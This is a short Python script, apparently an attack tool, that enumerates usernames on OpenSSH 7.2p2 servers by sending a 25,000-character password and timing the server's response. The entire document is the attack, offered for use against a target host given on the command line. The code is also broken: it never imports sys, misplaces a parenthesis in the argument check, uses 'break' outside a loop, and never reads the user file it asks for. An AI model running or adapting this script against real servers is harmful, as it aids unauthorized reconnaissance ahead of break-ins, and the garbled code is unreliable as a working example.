#!/usr/bin/env python3
#User enumeration using opensshd 7.2p2
import paramiko
import time
if (len(sys.argv < 2)
       print("enum_ssh usage: python enum_ssh host file_with_user")
       break
user=raw_input("user: ")
ip_host=sys.argv[1]
file_user=sys.argv[2]
p='A'*25000
ssh = paramiko.SSHClient()
starttime=time.clock()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
        ssh.connect(ip_host, username=user, password=p)
except:
        endtime=time.clock()
total=endtime-starttime
print(total)
